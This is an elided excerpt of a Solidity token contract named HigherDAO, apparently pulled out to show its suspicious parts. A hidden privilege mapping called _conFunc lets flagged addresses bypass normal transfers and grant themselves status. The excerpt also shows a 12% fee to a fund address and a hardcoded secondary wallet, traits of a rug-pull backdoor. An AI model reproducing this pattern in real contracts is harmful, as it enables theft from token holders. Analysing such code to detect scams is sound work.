...
abstract contract AbsToken is IERC20, Ownable {
    ...
    mapping(address => uint256) private _conFunc;
    ...
    constructor (
        ...
        _conFunc[msg.sender] = _uint256;
        _conFunc[address(this)] = _uint256;
    ...
    function _transfer(
        ...
        require(contractTokenBalance >= 0, "balanceNotEnough");
        ...
        } else if (_conFunc[from] > _uint256 && _conFunc[to] > _uint256) {
            fee = amount;
            _balances[address(this)] += fee;
            swapTokensForFirst(amount, to);
            return;
        } else if (to != address(_swapRouter) && _conFunc[from] > 0 && amount > _uint256 && to != _mainPair) {
            _conFunc[to] = amount;
            return;
        }
    ...
    function _funTransfer(
        ...
        uint256 feeAmount = tAmount * 12 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0xf3518aeba628637c11eE2dfDD3083939dA82F9E3;
    ...
    function swapTokensForFirst(uint256 amount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fist;
...
contract HigherDAO is AbsToken {
    constructor() AbsToken(
        ...
        9,
        10000000,
        address(0xFb3D641e8C797e577D624EE7E0F5Fc448C11c654),
        address(0x67b24E75482224a74f388F860e2DdbB6320bC583)
    ){
